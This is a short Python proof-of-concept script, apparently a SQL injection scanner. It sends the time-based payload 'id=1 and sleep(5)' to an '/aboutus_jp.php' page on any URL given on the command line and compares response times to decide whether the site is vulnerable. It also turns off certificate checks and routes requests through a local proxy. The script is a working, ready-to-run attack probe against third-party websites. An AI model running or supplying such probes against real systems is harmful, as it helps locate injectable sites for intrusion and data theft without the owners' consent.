import time
import requests
import argparse

requests.packages.urllib3.disable_warnings()


def banner():
    test = """sqli_sleep.py"""
    print(test)


def poc(target):
    payload1 = '/aboutus_jp.php?id=1'
    payload = '/aboutus_jp.php?id=1 and sleep(5)'
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }

    try:
        res1 = requests.get(url=target + payload, verify=False, proxies=proxies, timeout=10)
        res2 = requests.get(url=target + payload1, verify=False, proxies=proxies, timeout=10)
    except requests.RequestException as e:
        print(f"请求失败: {e}")
        return

    time1 = res1.elapsed.total_seconds()
    time2 = res2.elapsed.total_seconds()

    if time1 - time2 >= 5 and time1 > 5:
        print(f"该 {target} 存在延时注入漏洞")
    else:
        print(f"该 {target} 不存在明显的延时注入漏洞")


def main():
    banner()
    parser = argparse.ArgumentParser(description="这是一个延时注入脚本")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter url')
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    else:
        print("请提供 URL 参数。")


if __name__ == '__main__':
    main()



